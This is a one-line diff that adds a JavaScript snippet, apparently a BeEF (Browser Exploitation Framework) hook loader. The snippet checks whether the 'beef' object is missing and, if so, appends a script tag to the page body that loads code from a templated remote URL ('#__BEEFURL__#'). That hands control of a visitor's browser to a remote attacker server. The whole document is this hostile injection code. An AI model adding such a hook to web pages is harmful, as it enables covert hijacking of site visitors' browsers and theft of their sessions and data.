@@ -1,0 +1,1 @@
+(function () { var url = '#__BEEFURL__#';if (typeof beef == 'undefined') { var bf = document.createElement('script'); bf.type = 'text/javascript'; bf.src = url; document.body.appendChild(bf);}})();
